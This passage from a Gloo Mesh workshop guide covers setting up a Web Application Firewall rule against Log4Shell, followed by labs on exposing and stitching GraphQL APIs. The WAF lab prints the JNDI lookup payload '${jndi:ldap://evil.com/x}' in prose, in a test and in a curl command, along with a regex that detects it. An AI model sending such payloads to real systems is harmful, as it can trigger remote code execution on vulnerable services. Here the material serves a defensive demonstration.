This diagram shows the flow of the request (with the Istio ingress gateway leveraging the `rate limiter` Pod to determine if the request should be allowed):

![Gloo Mesh Gateway Rate Limiting](images/steps/gateway-ratelimiting/gloo-mesh-gateway-rate-limiting.svg)

Let's apply the original `RouteTable` yaml:
```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      forwardTo:
        destinations:
        - ref:
            name: not-in-mesh
            namespace: httpbin
            cluster: cluster1
          port:
            number: 8000
EOF
```

And also delete the different objects we've created:
```bash
kubectl --context ${CLUSTER1} -n httpbin delete ratelimitpolicy httpbin
kubectl --context ${CLUSTER1} -n httpbin delete ratelimitserverconfig httpbin
```





## Lab 16 - Use the Web Application Firewall filter <a name="lab-16---use-the-web-application-firewall-filter-"></a>
[<img src="https://img.youtube.com/vi/9q2TxtBDqrA/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/9q2TxtBDqrA "Video Link")

A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.

Gloo Mesh includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections. 

An example of how using Gloo Mesh we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.

The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit. 

Using the Web Application Firewall capabilities you can reject requests containing such headers. 

Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.

Create the WAF policy:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: WAFPolicy
metadata:
  name: log4shell
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        waf: "true"
  config:
    disableCoreRuleSet: true
    customInterventionMessage: 'Log4Shell malicious payload'
    customRuleSets:
    - ruleStr: |
        SecRuleEngine On
        SecRequestBodyAccess On
        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
          "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://" 
          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
EOF
```

In this example, we're going to update the main `RouteTable` to enforce this policy for all the applications exposed through the gateway (in any workspace).

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: main-httpbin
  namespace: istio-gateways
spec:
  hosts:
    - cluster1-httpbin.example.com
  virtualGateways:
    - name: north-south-gw
      namespace: istio-gateways
      cluster: cluster1
  workloadSelectors: []
  http:
    - name: root
      labels:
        waf: "true"
      matchers:
      - uri:
          prefix: /
      delegate:
        routeTables:
          - labels:
              expose: "true"
            workspace: httpbin
        sortMethod: ROUTE_SPECIFICITY
EOF
```

<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
const helpersHttp = require('./tests/chai-http');
var chai = require('chai');
var expect = chai.expect;

describe("WAF is working properly", function() {
  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{key: 'x-my-header', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/gateway-waf/tests/waf.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Run the following command to simulate an attack:

```bash
curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://cluster1-httpbin.example.com/get" -i
```

The request should be rejected:

```,nocopy
HTTP/2 403 
content-length: 27
content-type: text/plain
date: Tue, 05 Apr 2022 10:20:06 GMT
server: istio-envoy

Log4Shell malicious payload
```

Let's apply the original `RouteTable` yaml:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: main-bookinfo
  namespace: istio-gateways
spec:
  hosts:
    - cluster1-bookinfo.example.com
    - cluster2-bookinfo.example.com
  virtualGateways:
    - name: north-south-gw
      namespace: istio-gateways
      cluster: cluster1
  workloadSelectors: []
  http:
    - name: root
      matchers:
      - uri:
          prefix: /
      delegate:
        routeTables:
          - labels:
              expose: "true"
            workspace: bookinfo
          - labels:
              expose: "true"
            workspace: gateways
        sortMethod: ROUTE_SPECIFICITY
---
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: main-httpbin
  namespace: istio-gateways
spec:
  hosts:
    - cluster1-httpbin.example.com
  virtualGateways:
    - name: north-south-gw
      namespace: istio-gateways
      cluster: cluster1
  workloadSelectors: []
  http:
    - name: root
      matchers:
      - uri:
          prefix: /
      delegate:
        routeTables:
          - labels:
              expose: "true"
            workspace: httpbin
        sortMethod: ROUTE_SPECIFICITY
EOF
```

And also delete the waf policy we've created:

```bash
kubectl --context ${CLUSTER1} -n httpbin delete wafpolicies.security.policy.gloo.solo.io log4shell
```




## Lab 17 - Expose the bookinfo application through GraphQL <a name="lab-17---expose-the-bookinfo-application-through-graphql-"></a>
[<img src="https://img.youtube.com/vi/ucVMxX8oFz0/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/ucVMxX8oFz0 "Video Link")

Gloo Mesh is enhancing the Istio Ingress Gateway to allow exposing some REST services as a GraphQL API.

First, you need to create an `ApiDoc` to define your GraphQL API:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: ApiDoc
metadata:
  name: bookinfo-api-doc
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  graphql:
    schemaDefinition: |-
      type Query {
        """Description of a book in HTML"""
        productsForHome: [Product] 
      }
      """Each book has a product entry"""
      type Product {
        """Unique identifier for books"""
        id: String
        """The book title"""
        title: String
        """Number of pages in the book"""
        pages: Int
        """Year the book was published"""
        year: Int
        """Description of a book in HTML"""
        descriptionHtml: String
        """List of reader reviews for this book. Queries the reviews REST service"""
        reviews: [Review]
        """List of reader ratings for this book. Queries the ratings REST service"""
        ratings: [Rating]
      }
      """A book review"""
      type Review {
        """Name of the reviewer"""
        reviewer: String
        """Review details"""
        text: String
        "Reviewer Rating, this field is provided by the reviews REST service, which queries the ratings REST service"
        rating: ReviewerRating
      }
      type ReviewerRating {
        stars: Int
        color: String
      }
      """A book rating"""
      type Rating {
        """Name of the user peforming the rating"""
        reviewer: String
        """Number of stars for this rating"""
        numStars: Int
      }
EOF
```

Then, you need to create a `GraphQLResolverMap` to define the resolvers:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: GraphQLResolverMap
metadata:
  name: bookinfo-graphql-resolvers
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  types:
    Query:
      fields:
        productsForHome:
          resolvers:
          - restResolver:
              destinations:
              - port:
                  number: 9080
                ref:
                  name: productpage
                  namespace: bookinfo-frontends
                  cluster: cluster1
              request:
                headers:
                  :path:
                    jq: '"/api/v1/products"'
    Product:
      fields:
        reviews:
          variables:
            parentVar:
              graphqlParent: {}
            resolverResultVar:
              resolverResult: {}
          resolvers:
          - restResolver:
              destinations:
              - port:
                  number: 9080
                ref:
                  name: reviews
                  namespace: bookinfo-backends
                  cluster: cluster1
              request:
                headers:
                  :path:
                    jq: '"/reviews/" + (.parentVar.id | tostring)'
            resolverResultTransform:
              jq: '.resolverResultVar.reviews'
        ratings:
          variables:
            parentVar:
              graphqlParent: {}
            resolverResultVar:
              resolverResult: {}
          resolvers:
          - restResolver:
              destinations:
              - port:
                  number: 9080
                ref:
                  name: ratings
                  namespace: bookinfo-backends
                  cluster: cluster1
              request:
                headers:
                  :path:
                    jq: '"/ratings/" + (.parentVar.id | tostring)'
            resolverResultTransform:
              jq: '.resolverResultVar.ratings | to_entries | map(.reviewer=.key | .numStars=.value | del(.key,.value))'
EOF
```

After that, you need to create an `ApiSchema` which references the `ApiDoc` and the `GraphQLResolverMap`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: GraphQLSchema
metadata:
  name: bookinfo-graphql-schema
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  schemaRef:
    name: bookinfo-api-doc
    namespace: bookinfo-frontends
    clusterName: cluster1
  resolved:
    options: {}
    resolverMapRefs:
    - name: bookinfo-graphql-resolvers
      namespace: bookinfo-frontends
      clusterName: cluster1
EOF
```

Finally, you can create a `RouteTable` to expose the GraphQL API:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: graphql
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  http:
  - graphql:
      schema:
        name: bookinfo-graphql-schema
        namespace: bookinfo-frontends
        clusterName: cluster1
    matchers:
    - uri:
        prefix: /graphql
    labels:
      graphql: "true"
EOF
```

Now, you can try to 

```bash
curl -k "https://cluster1-bookinfo.example.com/graphql" --data '{"query":"{productsForHome { title ratings {reviewer numStars}}}"}' | jq .
```

Here is the expected output:

```
{
  "data": {
    "productsForHome": [
      {
        "title": "The Comedy of Errors",
        "ratings": [
          {
            "reviewer": "Reviewer1",
            "numStars": 5
          },
          {
            "reviewer": "Reviewer2",
            "numStars": 4
          }
        ]
      }
    ]
  }
}
```

<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("GraphQL", function() {
  it('GraphQL query returning the expected output', function () {
    
    let command = `curl -ks "https://cluster1-bookinfo.example.com/graphql" --data '{"query":" {productsForHome { title ratings {reviewer numStars}}}"}'`
    let cli = chaiExec(command);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('{"data":{"productsForHome":[{"title":"The Comedy of Errors","ratings":[{"reviewer":"Reviewer1","numStars":5},{"reviewer":"Reviewer2","numStars":4}]}]}}');
  })
});
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/bookinfo/gateway-graphql/tests/graphql.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Create the following `CORSPolicy` to allow using the GraphQL explorer from the Gloo Mesh UI:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: CORSPolicy
metadata:
  name: graphql-explorer
  namespace: bookinfo-frontends
spec:
  applyToRoutes:
  - route:
      labels:
        graphql: "true"
  config:
    allowCredentials: true
    allowHeaders:
    - apollo-query-plan-experimental
    - content-type
    - x-apollo-tracing
    allowMethods:
    - POST
    allowOrigins:
    - regex: ".*"
EOF
```



## Lab 18 - Leverage GraphQL stitching <a name="lab-18---leverage-graphql-stitching-"></a>
[<img src="https://img.youtube.com/vi/CuTOrhJNIVs/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/CuTOrhJNIVs "Video Link")

In this lab, we're going to expose and External REST API as a GraphQL API and then to stitch is with the GraphQL API we've created previously.

First, you need to create an `ApiDoc` to define your GraphQL API:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: ApiDoc
metadata:
  name: openlibrary-api-doc
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  graphql:
    schemaDefinition: |-
      type Query {
        product(title: String!): Product
      }
      type Product {
        title: String
        languages: [String]
      }
EOF
```

You also need to create an external service to define how to access the host `openlibrary.org`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: ExternalService
metadata:
  name: openlibrary
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  hosts:
  - openlibrary.org
  ports:
  - name: http
    number: 80
    protocol: HTTP
  - name: https
    number: 443
    protocol: HTTPS
    clientsideTls: {}
EOF
```

Then, you need to create a `GraphQLResolverMap` to define the resolvers:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: GraphQLResolverMap
metadata:
  name: openlibrary-graphql-resolvers
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  types:
    Query:
      fields:
        product:
          variables:
            titleVar:
              graphqlArg: title
            resolverResultVar:
              resolverResult: {}
          resolvers:
          - restResolver:
              destinations:
              - port:
                  number: 80
                kind: EXTERNAL_SERVICE
                ref:
                  name: openlibrary
                  namespace: bookinfo-frontends
                  cluster: cluster1
              request:
                headers:
                  :authority:
                    jq: '"openlibrary.org"'
                  :path:
                    jq: '"/search.json"'
                queryParams:
                  title:
                    jq: '.titleVar | @uri'
                  fields:
                    jq: '"language"'
            resolverResultTransform:
              jq: '{title: .titleVar, languages: [.resolverResultVar.docs[] | select(.language != null) | .language] | add | unique}'
EOF
```

After that, you need to create an `ApiSchema` which references the `ApiDoc` and the `GraphQLResolverMap`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: GraphQLSchema
metadata:
  name: openlibrary-graphql-schema
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  schemaRef:
    name: openlibrary-api-doc
    namespace: bookinfo-frontends
    clusterName: cluster1
  resolved:
    options: {}
    resolverMapRefs:
    - name: openlibrary-graphql-resolvers
      namespace: bookinfo-frontends
      clusterName: cluster1
EOF
```

Finally, you can create a `RouteTable` to expose the GraphQL API:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: openlibrary
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  http:
  - graphql:
      options:
        logSensitiveInfo: true
      schema:
        name: openlibrary-graphql-schema
        namespace: bookinfo-frontends
        clusterName: cluster1
    matchers:
    - uri:
        prefix: /openlibrary
    labels:
      graphql: "true"
EOF
```

Now, you can try to access the GraphQL API:

```
curl -ks "https://cluster1-bookinfo.example.com/openlibrary" --data '{"query":"{product(title: \"The Comedy of Errors\"){title languages}}"}' -X POST | jq .
```

Here is the expected output:

```
{
  "data": {
    "product": {
      "title": "The Comedy of Errors",
      "languages": [
        "chi",
        "dut",
        "eng",
        "esp",
        "fin",
        "fre",
        "ger",
        "heb",
        "ita",
        "mul",
        "nor",
        "slo",
        "spa",
        "tsw",
        "tur",
        "und"
      ]
    }
  }
}
```

<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("GraphQL", function() {
  it('GraphQL query returning the expected output', function () {
    
    let command = `curl -ks "https://cluster1-bookinfo.example.com/openlibrary" --data '{"query":"{product(title: \\"The Comedy of Errors\\"){title languages}}"}'`
    let cli = chaiExec(command);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('{"data":{"product":{"title":"The Comedy of Errors","languages":["chi","dut","eng","esp","fin","fre","ger","heb","ita","mul","nor","slo","spa","tsw","tur","und"]}}}');
  })
});
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/bookinfo/gateway-graphql-stitching/tests/graphql.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Let's now stitch together the 2 GraphQL API.

For this, you need to create a `GraphQLStitchedSchema` which references the 2 existing `GraphQLSchema` and how to merge them:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: GraphQLStitchedSchema
metadata:
  name: openlibrary-graphql-stitched-schema
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  subschemas:
  - schema:
      name: bookinfo-graphql-schema
      namespace: bookinfo-frontends
      clusterName: cluster1
  - schema:
      name: openlibrary-graphql-schema
      namespace: bookinfo-frontends
      clusterName: cluster1
    typeMerge:
      Product:
        selectionSet: '{ title }'
        queryName: product
        args:
          title: title
EOF
```

Then, you can create a new `RouteTable` to expose the stitched GraphQL API:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: graphql-stitched
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  http:
  - graphql:
      stitchedSchema:
        name: openlibrary-graphql-stitched-schema
        namespace: bookinfo-frontends
        clusterName: cluster1
    matchers:
    - uri:
        prefix: /graphql-stitched
    labels:
      graphql: "true"
EOF
```

Now, you can try to access the GraphQL API:

```
curl -ks "https://cluster1-bookinfo.example.com/graphql-stitched" --data '{"query":"{productsForHome { title languages ratings {reviewer numStars}}}"}' -X POST | jq .
```

Here is the expected output:

```
{
  "data": {
    "productsForHome": [
      {
        "title": "The Comedy of Errors",
        "languages": [
          "chi",
          "dut",
          "eng",
          "esp",
          "fin",
          "fre",
          "ger",
          "heb",
          "ita",
          "mul",
          "nor",
          "slo",
          "spa",
          "tsw",
          "tur",
          "und"
        ],
        "ratings": [
          {
            "reviewer": "Reviewer1",
            "numStars": 5
          },
          {
            "reviewer": "Reviewer2",
            "numStars": 4
          }
        ]
      }
    ]
  }
}
```

You can see we have an output which combines the data obtained from the 2 GraphQL APIs.

<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("GraphQL stitched", function() {
  it('GraphQL query returning the expected output', function () {
    
    let command = `curl -ks "https://cluster1-bookinfo.example.com/graphql-stitched" --data '{"query":" {productsForHome { title languages ratings {reviewer numStars}}}"}'`
    let cli = chaiExec(command);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('{"data":{"productsForHome":[{"title":"The Comedy of Errors","languages":["chi","dut","eng","esp","fin","fre","ger","heb","ita","mul","nor","slo","spa","tsw","tur","und"],"ratings":[{"reviewer":"Reviewer1","numStars":5},{"reviewer":"Reviewer2","numStars":4}]}]}}');
  })
});
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/bookinfo/gateway-graphql-stitching/tests/graphql-stitched.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



